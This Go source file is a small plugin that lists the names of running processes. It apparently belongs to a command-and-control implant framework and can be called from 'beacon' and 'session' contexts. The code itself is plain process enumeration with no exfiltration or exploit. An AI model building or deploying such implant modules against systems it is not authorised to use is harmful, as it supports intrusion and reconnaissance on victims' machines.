package main

import (
	"fmt"
	"strings"

	"github.com/shirou/gopsutil/v3/process"

	"src/Client/dynamic/shared"
	Logger "src/Client/generic/logger"

	"github.com/hashicorp/go-plugin"
)

var (
	pluginName = "services"
)

// ListServicesCommand implements shared.Command and lists running services/processes.
type ListServicesCommand struct{}

// Execute is called when the command is run in the default context.
func (c *ListServicesCommand) Execute(args []string) (string, error) {
	Logger.Log("ListServicesCommand.Execute called (default context)")
	procs, err := process.Processes()
	if err != nil {
		return "", err
	}
	var services []string
	for _, p := range procs {
		if name, err := p.Name(); err == nil {
			services = append(services, name)
		}
	}
	return strings.Join(services, "\n"), nil
}

// ExecuteFromSession is called when the command is run from a session context.
func (c *ListServicesCommand) ExecuteFromSession(args []string) (string, error) {
	Logger.Log("YourCommandImpl.ExecuteFromSession called")
	// Reuse default logic
	return c.Execute(args)
}

// ExecuteFromBeacon is called when the command is run from a beacon context.
// 'data' might contain additional information passed from the beacon.
func (c *ListServicesCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
	Logger.Log(fmt.Sprintf("YourCommandImpl.ExecuteFromBeacon called with data: %s", data))
	output, err := c.Execute(args)
	if err != nil {
		Logger.Error(fmt.Sprintf("Error in beacon context: %v", err))
		return "", err
	}
	return output, nil
}

// --- Main function for the plugin executable ---

func main() {
	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &ListServicesCommand{}},
		},
	})
}
